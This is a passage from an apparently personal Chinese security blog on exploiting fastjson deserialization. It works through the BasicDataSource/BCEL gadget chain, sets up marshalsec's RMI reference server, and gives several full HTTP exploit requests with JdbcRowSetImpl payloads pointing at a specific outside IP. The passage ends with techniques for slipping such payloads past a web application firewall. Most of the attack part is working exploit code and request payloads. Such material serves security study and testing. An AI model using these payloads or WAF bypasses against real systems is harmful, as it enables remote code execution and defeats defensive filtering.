class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;becl编码的class&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;driverClassloader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>fastjson就要找get函数，看入口类<code>BasicDataSoure</code>的get方法，找到<code>getConnection</code>方法：</p><p><img src="/../../../blog_image/image-20240416152130661.png" alt="image-20240416152130661"></p><p>跟进<code>createDataSoure</code>方法里面的<code>createConncetionFactory</code>方法：</p><p><img src="/../../../blog_image/image-20240416152219472.png" alt="image-20240416152219472"></p><p><code>createConncetionFactory</code>方法里面调用了<code>ConnectionFactoryFactory#createConnectionFactory</code></p><p><img src="/../../../blog_image/image-20240416152350731.png" alt="image-20240416152350731"></p><p>查看<code>createDriver</code>方法，点击调试前，会调用<code>ClassLoader(BECL)</code></p><p><img src="/../../../blog_image/image-20240416154104943.png" alt="image-20240416154104943"></p><p>然后会调用<code>getDriverClassName</code>方法，获取driverClassName，并且获取classloader类加载器：</p><p><img src="/../../../blog_image/image-20240416154141682.png" alt="image-20240416154141682"></p><p>恶意代码是这一行：</p><p><img src="/../../../blog_image/image-20240416154458959.png" alt="image-20240416154458959"></p><p>直接调用<code>Class.forName</code>，正常我们的代码是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>();<br>classLoader.loadClass(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>+code).newInstance();<br></code></pre></td></tr></table></figure><p>我们可以尝试跑一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\fastjson\\1224\\target\\classes\\Calc.class&quot;</span>));<br><span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes, <span class="hljs-literal">true</span>);<br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">driverClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>();<br>Class.forName(<span class="hljs-string">&quot;$$BCEL$$&quot;</span>+code, <span class="hljs-literal">true</span>, driverClassLoader);<br></code></pre></td></tr></table></figure><p>效果和上面的一样，<code>Class.forName()</code>的第二个参数是是否实例化，设置为true则会调用<code>newInstance</code>方法，第三个参数是加载器。因此这段代码和上面的一样。然后我们观察上面的恶意代码，如果<code>driverClassName</code>可控，那么就可以实现反序列化了。</p><p><code>driverClassName</code>是通过调用get方法去获取的，</p><p><img src="/../../../blog_image/image-20240416155248465.png" alt="image-20240416155248465"></p><p>发现存在set方法，可以使用fastjson进行赋值：</p><p><img src="/../../../blog_image/image-20240416155349042.png" alt="image-20240416155349042"></p><p>而同理<code>driverClassLoader</code>也是可控的，</p><p>因此构造思路如下：</p><blockquote><ol><li>首先@type BasicDataSource这个类，然后对driverClassName进行赋值，设置为我们的becl编码的值</li><li>同理调用@type BasicDataSource 对driverClassLoader进行赋值，设置为com.sun.org.apache.bcel.internal.util.ClassLoader（tomcat7和8不一样，需要注意。）</li><li>然后调用主入口BasicDataSource#getConnection方法。</li></ol></blockquote><p>尝试自己构造payload，然后发现这个<code>getConncetion</code>哪里调用的？</p><p>如果使用parse，会发现没有结果。</p><p>这里就要使用<code>parseObejct</code>方法，因为<code>parseObject</code>方法会调用传入类的所有get方法，那么就会调用<code>getConnection</code>方法，可以看下面的demo：</p><p><img src="/../../../blog_image/image-20240416160901477.png" alt="image-20240416160901477"></p><p>因此完整的exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\fastjson\\1224\\target\\classes\\Calc.class&quot;</span>));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(bytes, <span class="hljs-literal">true</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span> + code + <span class="hljs-string">&quot;\&quot;,\&quot;driverClassloader\&quot;: &#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;<br>    JSON.parseObject(s);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>BasicDataSoure这条链，在<code>&lt;=1.2.24</code>版本才适用，在<code>1.2.25</code>版本后<code>org.apache.tomcat</code>包设置为了黑名单，不能进行反序列化了。</p><p>这条链的主要逻辑是调用java的<code>BECL</code>，其中的<code>ClassLoader</code>的<code>loadClass</code>是public的，并且<code>BasicDataSource</code>的<code>driverClassLoader</code>和<code>driverClassName</code>是可控的，因此才会出现rec。</p><p>在这条链中，需要注意tomcat的版本，但只有两个版本，因此都试一下，还有是服务端需要使用<code>parseObject</code>，而不是使用<code>parse</code>方法，如果使用<code>parse</code>方法，不会调用所有get方法，getConncetion方法也不会被调用，这条链就不能执行了。</p><h1 id="0x06-fastjson的一些小工具："><a href="#0x06-fastjson的一些小工具：" class="headerlink" title="0x06 fastjson的一些小工具："></a>0x06 fastjson的一些小工具：</h1><h2 id="marshalsec："><a href="#marshalsec：" class="headerlink" title="marshalsec："></a>marshalsec：</h2><h3 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载marshalsec：<br>git <span class="hljs-built_in">clone</span> https://github.com/mbechler/marshalsec.git<br>安装maven：<br>apt-get install maven<br></code></pre></td></tr></table></figure><p>修改配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/share/maven/conf<br>vim settings.xml<br></code></pre></td></tr></table></figure><p>在<code>mirrors</code>目录中添加阿里云的镜像：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>aliyunmaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>阿里云公共仓库<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在解压目录下编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn clean package -DskipTests<br></code></pre></td></tr></table></figure><h3 id="编写class文件："><a href="#编写class文件：" class="headerlink" title="编写class文件："></a>编写class文件：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;touch /tmp/fastjson&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译成class文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac Calc.java<br></code></pre></td></tr></table></figure><p>然后启动一个http服务，在<code>Calc.class</code>目录下：</p><p><img src="/../../../blog_image/image-20240408172353815.png" alt="image-20240408172353815"></p><p>运行marshalsec：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://[vps]/#Calc&quot;</span> 9999<br></code></pre></td></tr></table></figure><p>表示从vps服务器的80端口上下载<code>Calc</code>这个文件，并且开了的rmi端口为<code>9999</code>。</p><p>poc如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>159<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://121.37.229.215:9999/Calc&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span></span><br><span class="language-json">    <span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>上雷池后会被拦截。</p><p><img src="/../../../blog_image/image-20240408172721392.png" alt="image-20240408172721392"></p><h1 id="0x07-bypass-waf的小技巧："><a href="#0x07-bypass-waf的小技巧：" class="headerlink" title="0x07 bypass waf的小技巧："></a>0x07 bypass waf的小技巧：</h1><h2 id="1-json字段不适用双引号绕过："><a href="#1-json字段不适用双引号绕过：" class="headerlink" title="1. json字段不适用双引号绕过："></a>1. json字段不适用双引号绕过：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, dataSourceName:\&quot;rmi://localhost:1099/aa\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure><p>还是得配合<code>,</code>进行绕过：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>178<br><br><span class="language-autohotkey">&#123;</span><br><span class="language-autohotkey">    <span class="hljs-string">&quot;b&quot;</span>:&#123;</span><br><span class="language-autohotkey"> ,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,</span><br><span class="language-autohotkey">,      <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="language-autohotkey"><span class="hljs-title">        dataSourceName:</span><span class="hljs-string">&quot;rmi://121.37.229.215:9999/Calc&quot;</span>,</span><br><span class="language-autohotkey">        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span></span><br><span class="language-autohotkey">    &#125;</span><br><span class="language-autohotkey">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="2-使用-绕过："><a href="#2-使用-绕过：" class="headerlink" title="2. 使用,绕过："></a>2. 使用<code>,</code>绕过：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;,,,,,,,,,,,,\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,,,,,,,,,,,,,,,,,,,,,,,,,, dataSourceName:\&quot;rmi://localhost:1099/aa\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure><p>查看<code>DefaultJSONParser</code>：</p><p><img src="/../../../blog_image/image-20240408160021511.png" alt="image-20240408160021511"></p><p>原理是默认开启了<code>Feature.AllowArbitraryCommas</code>。</p><p>如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>193<br><br><span class="language-autohotkey">&#123;</span><br><span class="language-autohotkey">    <span class="hljs-string">&quot;b&quot;</span>:&#123;</span><br><span class="language-autohotkey"> ,,,,,,,,,,       <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,,,,,,,,,,,,,,,,,</span><br><span class="language-autohotkey">        <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://121.37.229.215:9999/Calc&quot;</span>,,,,,,,,,</span><br><span class="language-autohotkey">        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span></span><br><span class="language-autohotkey">    &#125;</span><br><span class="language-autohotkey">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="3-垃圾字符绕过："><a href="#3-垃圾字符绕过：" class="headerlink" title="3. 垃圾字符绕过："></a>3. 垃圾字符绕过：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\r\r\b&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,,,,,,,,,,,,,,,,,,,,,,,,,, dataSourceName:\&quot;rmi://localhost:1099/aa\&quot;, \b\r\&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(payload);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>JSONLexerBase#skipWhitespace</code>方法：</p><p><img src="/../../../blog_image/image-20240408160217652.png" alt="image-20240408160217652"></p><p>主要用于将<code>空格</code>，<code>\r</code>，<code>\n</code>，<code>\t</code>，<code>\f</code>，<code>\b</code>去除。</p><h2 id="4-type后的值第一个引号可以替换为其他字符："><a href="#4-type后的值第一个引号可以替换为其他字符：" class="headerlink" title="4. @type后的值第一个引号可以替换为其他字符："></a>4. @type后的值第一个引号可以替换为其他字符：</h2><p><img src="/../../../blog_image/image-20240409092236511.png" alt="image-20240409092236511"></p><p>这里我们可以对比之前获取<code>@type</code>的过程，先检验了当前位置是<code>&quot;</code>再扫描到下一个<code>&quot;</code>之间的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;&quot;&#x27;</span>) &#123;<br>  key = lexer.scanSymbol(<span class="hljs-built_in">this</span>.symbolTable, <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>  lexer.skipWhitespace();<br>  ch = lexer.getCurrent();<br><span class="hljs-comment">//省略不必要代码</span><br>&#125;<br></code></pre></td></tr></table></figure><p>因此可以证明是@type后的值第一个引号可以替换为其他字符，因此可以构造payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span>?com.sun.rowset.JdbcRowSetImpl<span class="hljs-string">&quot;,&quot;</span>dataSourceName<span class="hljs-string">&quot;:&quot;</span>rmi<span class="hljs-punctuation">:</span><span class="hljs-comment">//127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true</span><br></code></pre></td></tr></table></figure><p>并且第一个字符后面不用双引号。即左边不用双引号+随机一个字符，右边则需要双引号。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><br><span class="language-d">&#123;</span><br><span class="language-d">    <span class="hljs-string">&quot;b&quot;</span>:&#123;</span><br><span class="language-d">        <span class="hljs-string">&quot;@type&quot;</span>:xcom.sun.rowset.JdbcRowSetImpl<span class="hljs-string">&quot;,</span></span><br><span class="hljs-string"><span class="language-d">        dataSourceName:&quot;</span>rmi:<span class="hljs-comment">//121.37.229.215:9999/Calc&quot;,</span></span><br><span class="language-d">        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span></span><br><span class="language-d">    &#125;</span><br><span class="language-d">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="5-unicode-hex编码绕过："><a href="#5-unicode-hex编码绕过：" class="headerlink" title="5. unicode&#x2F;hex编码绕过："></a>5. unicode&#x2F;hex编码绕过：</h2><p>在<code>JSONLexerBase#scanSymbol</code>方法中：</p><p>如果当前字符是<code>\u</code>或者是<code>\x</code>都会进行编码操作。</p><p><img src="/../../../blog_image/image-20240409093048480.png" alt="image-20240409093048480"></p><p>单纯使用unicode编码在雷池中会被检测出：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>170<br><br><span class="language-wren">&#123;</span><br><span class="language-wren">    <span class="hljs-string">&quot;b&quot;</span>:&#123;</span><br><span class="language-wren"> <span class="hljs-string">&quot;<span class="hljs-char escape_">\u0040</span><span class="hljs-char escape_">\u0074</span><span class="hljs-char escape_">\u0079</span><span class="hljs-char escape_">\u0070</span><span class="hljs-char escape_">\u0065</span>&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="language-wren"> <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://121.37.229.215:9999/Calc&quot;</span>,</span><br><span class="language-wren">        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span></span><br><span class="language-wren">    &#125;</span><br><span class="language-wren">&#125;</span><br></code></pre></td></tr></table></figure><p>尝试混合编码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>121.37.229.215:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>166<br><br><span class="language-wren">&#123;</span><br><span class="language-wren">    <span class="hljs-string">&quot;b&quot;</span>:&#123;</span><br><span class="language-wren"> <span class="hljs-string">&quot;<span class="hljs-char escape_">\u0040</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\u0079</span><span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\u0065</span>&quot;</span>:<span 